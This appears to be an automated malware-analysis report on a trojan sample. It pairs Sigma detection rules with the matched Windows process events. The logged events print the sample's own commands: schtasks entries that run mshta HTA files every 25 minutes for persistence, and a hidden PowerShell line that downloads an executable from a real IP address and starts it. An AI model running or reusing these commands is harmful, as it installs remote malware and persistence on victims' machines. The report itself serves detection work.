threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

sigma_analysis_results.rule_title: Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE
sigma_analysis_results.rule_description: Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware

match_context.values: @{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=schtasks.exe; Hashes=MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; Description=Task Scheduler Configuration Tool; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\system32\cmd.exe /c schtasks /create /tn rgdfDmaYllP /tr "mshta C:\Users\Bruno\AppData\Local\Temp\8fhPkWdie.hta" /sc minute /mo 25 /ru "Bruno" /f; CommandLine=schtasks  /create /tn rgdfDmaYllP /tr "mshta C:\Users\Bruno\AppData\Local\Temp\8fhPkWdie.hta" /sc minute /mo 25 /ru "Bruno" /f; EventID=1; ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\schtasks.exe; Company=Microsoft Corporation}

@{Hashes=SHA1=AF506B15498F0DB1A4E350CC26F2A60D6C12146C,MD5=478BEAEC1C3A9417272BC8964ADD1CEE,SHA256=9A121ACF7686D2883E524332111D5E4BCC0C1A8E81136486FBA4CA65CA614407,IMPHASH=918DBB01101BFA7F1042CCA9520D2A05; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=schtasks.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Task Scheduler Configuration Tool; EventID=1; ParentCommandLine=C:\Windows\system32\cmd.exe /c schtasks /create /tn ZXjb7ma5xKZ /tr "mshta C:\Users\Bruno\AppData\Local\Temp\ar5eaP72R.hta" /sc minute /mo 25 /ru "Bruno" /f; CommandLine=schtasks  /create /tn ZXjb7ma5xKZ /tr "mshta C:\Users\Bruno\AppData\Local\Temp\ar5eaP72R.hta" /sc minute /mo 25 /ru "Bruno" /f; FileVersion=10.0.19041.906 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\cmd.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\schtasks.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Read Contents From Stdin Via Cmd.EXE
sigma_analysis_results.rule_description: Detect the use of "<" to read and potentially execute a file via cmd.exe

match_context.values: @{CommandLine=C:\Windows\system32\cmd.exe /c schtasks /create /tn adQmemaYMPW /tr mshta C:\Users\<USER>\AppData\Local\Temp\dTm5lczJp.hta /sc minute /mo 25 /ru azure /f; Image=C:\Windows\system32\cmd.exe; EventID=1}

sigma_analysis_results.rule_description: Detects suspicious PowerShell download command
Detects a Powershell process that contains download commands in its command line string
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=mshta C:\Users\Bruno\AppData\Local\Temp\8fhPkWdie.hta; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden $d=$env:temp+'WKVPH6AQBHCPSSDH32P39BHCOIOWBGN4.EXE';(New-Object System.Net.WebClient).DownloadFile('http://185.39.17.162/testmine/random.exe',$d);Start-Process $d;; EventID=1; ParentImage=C:\Windows\SysWOW64\mshta.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs
Detects modification of autostart extensibility point (ASEP) in registry.
sigma_analysis_results.rule_author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)

sigma_analysis_results.rule_title: Suspicious Msbuild Execution By Uncommon Parent Process
sigma_analysis_results.rule_description: Detects suspicious execution of 'Msbuild.exe' by a uncommon parent process

match_context.values: @{Hashes=MD5=8FDF47E0FF70C40ED3A17014AEEA4232,SHA256=ED9884BAC608C06B7057037CC91D90E4AE5F74DD2DBCE2AF476699C6D4492D82,IMPHASH=F34D5F2D4577ED6D9CEEC516C1F5A744; CurrentDirectory=C:\Windows\system32\; OriginalFileName=MSBuild.exe; Product=Microsoft\xae .NET Framework; Description=MSBuild.exe; FileVersion=4.8.4084.0 built by: NET48REL1; ParentCommandLine="C:\Users\Bruno\AppData\Local\Temp\10036350101\b580d2fb82.exe" ; CommandLine="C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"; EventID=1; ParentImage=C:\Users\Bruno\AppData\Local\Temp\10036350101\b580d2fb82.exe; IntegrityLevel=High; Image=C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

sigma_analysis_results.rule_title: Disable Tamper Protection on Windows Defender
sigma_analysis_results.rule_description: Detects disabling Windows Defender Tamper Protection
Detects the creation of the "PSScriptPolicyTest" PowerShell script by an uncommon process. This file is usually generated by Microsoft Powershell to test against Applocker.
Detects suspicious ways to download files or content using PowerShell

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentCommandLine=mshta C:\Users\Bruno\AppData\Local\Temp\8fhPkWdie.hta; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden $d=$env:temp+'WKVPH6AQBHCPSSDH32P39BHCOIOWBGN4.EXE';(New-Object System.Net.WebClient).DownloadFile('http://185.39.17.162/testmine/random.exe',$d);Start-Process $d;; EventID=1; ParentImage=C:\Windows\SysWOW64\mshta.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine
sigma_analysis_results.rule_author: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

match_context.values: @{Hashes=MD5=C32CA4ACFCC635EC1EA6ED8A34DF5FAC,SHA256=73A3C4AEF5DE385875339FC2EB7E58A9E8A47B6161BDC6436BF78A763537BE70,IMPHASH=194427A488ED1DD0A91731658B071667; CurrentDirectory=C:\Users\Bruno\Desktop\; OriginalFileName=PowerShell.EXE; Product=Microsoft\xae Windows\xae Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=mshta C:\Users\Bruno\AppData\Local\Temp\8fhPkWdie.hta; CommandLine="C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden $d=$env:temp+'WKVPH6AQBHCPSSDH32P39BHCOIOWBGN4.EXE';(New-Object System.Net.WebClient).DownloadFile('http://185.39.17.162/testmine/random.exe',$d);Start-Process $d;; FileVersion=10.0.19041.546 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\mshta.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; Company=Microsoft Corporation}
